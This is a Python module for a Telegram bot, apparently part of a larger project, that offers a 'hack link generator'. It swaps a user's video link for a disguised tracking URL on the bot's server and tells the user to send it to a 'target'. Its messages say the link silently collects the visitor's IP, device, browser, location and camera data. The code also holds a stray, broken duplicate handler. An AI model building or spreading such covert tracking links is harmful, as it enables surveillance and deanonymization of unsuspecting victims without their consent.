print("🔥 informationcracker.py LOADED")
import time
import uuid
from datetime import datetime
from telebot import types

# Import necessary objects from main
# Make sure these are correctly imported from your main.py or utils
from main import bot, OWNER_ID, RENDER_URL
from main import get_db, ensure_user, is_premium, OWNER_ID, RENDER_URL

# =============================================================================
# HACK LINK GENERATOR – /genlink & /terminal:gernatLINK
# =============================================================================

@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
def genlink_command(message):
    print("🔥 genlink_command CALLED")
    bot.reply_to(message, "✅ Test reply")
    return  # temporary
    w
@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
def genlink_command(message):
    ensure_user(message.from_user)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💀 ENTER VIDEO LINK", callback_data="genlink_enter"))

    danger_text = """
╔══════════════════════════════════╗
║  💀 *HACK LINK GENERATOR* 💀      ║
╠══════════════════════════════════╣
║                                   ║
║  ⚡ This tool generates a modified ║
║     link that collects visitor    ║
║     information silently.         ║
║                                   ║
║  ⚠️ USE AT YOUR OWN RISK          ║
║                                   ║
╚══════════════════════════════════╝
👇 Click button and paste your video link
    """
    bot.reply_to(message, danger_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data == "genlink_enter")
def genlink_ask_link(call):
    bot.edit_message_text(
        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(call.message, genlink_process_link)

def genlink_process_link(message):
    url = message.text.strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        bot.reply_to(message, "❌ *Invalid Link!* Must start with http:// or https://", parse_mode="Markdown")
        return

    # ========== DANGER ANIMATED LOADING ==========
    wait_msg = bot.reply_to(message, "💀 *INITIALIZING HACK...*", parse_mode="Markdown")
    
    frames = [
        "⚡ [          ] 0%",
        "🔴 [█         ] 10%",
        "🔴 [██        ] 20%",
        "🔴 [███       ] 30%",
        "🔴 [████      ] 40%",
        "🔴 [█████     ] 50%",
        "🔴 [██████    ] 60%",
        "🔴 [███████   ] 70%",
        "🔴 [████████  ] 80%",
        "🔴 [█████████ ] 90%",
        "💀 [██████████] 100%"
    ]
    
    for frame in frames:
        time.sleep(0.3)
        try:
            bot.edit_message_text(f"💀 *GENERATING LINK...*\n{frame}", wait_msg.chat.id, wait_msg.message_id, parse_mode="Markdown")
        except:
            pass
    
    time.sleep(0.5)
    bot.edit_message_text(
        "💀 *LINK GENERATED!*\n\n_Injecting tracking code..._",
        wait_msg.chat.id,
        wait_msg.message_id,
        parse_mode="Markdown"
    )
    time.sleep(0.8)
    
    link_id = str(uuid.uuid4())[:8]
    base = RENDER_URL
    modified_url = f"{base}/click/{link_id}"

    conn = get_db()
    conn.execute(
        "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
        (link_id, message.from_user.id, url, modified_url, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"genlink_copy_{link_id}"),
        types.InlineKeyboardButton("🔍 TEST LINK", url=modified_url)
    )
    
    success_text = f"""
╔══════════════════════════════════╗
║  💀 *HACK LINK READY* 💀          ║
╠══════════════════════════════════╣
║                                   ║
║  🔗 `{modified_url}`              ║
║                                   ║
║  📊 This link will collect:       ║
║  • IP Address                     ║
║  • Device Info                    ║
║  • Browser Details                ║
║  • Screen Resolution              ║
║  • Language & Timezone            ║
║  • Battery Level (if allowed)     ║
║  • Location (if allowed)          ║
║  • Camera (if allowed)            ║
║                                   ║
║  ⚠️ Send this link to target       ║
║                                   ║
╚══════════════════════════════════╝
    """
    bot.edit_message_text(
        success_text,
        wait_msg.chat.id,
        wait_msg.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("genlink_copy_"))
def genlink_copy_callback(call):
    link_id = call.data.split("_")[2]
    conn = get_db()
    row = conn.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,)).fetchone()
    conn.close()
    if row:
        bot.answer_callback_query(call.id, "✅ Copied to clipboard!")
        bot.send_message(call.message.chat.id, f"📋 `{row['modified_url']}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "❌ Link not found")
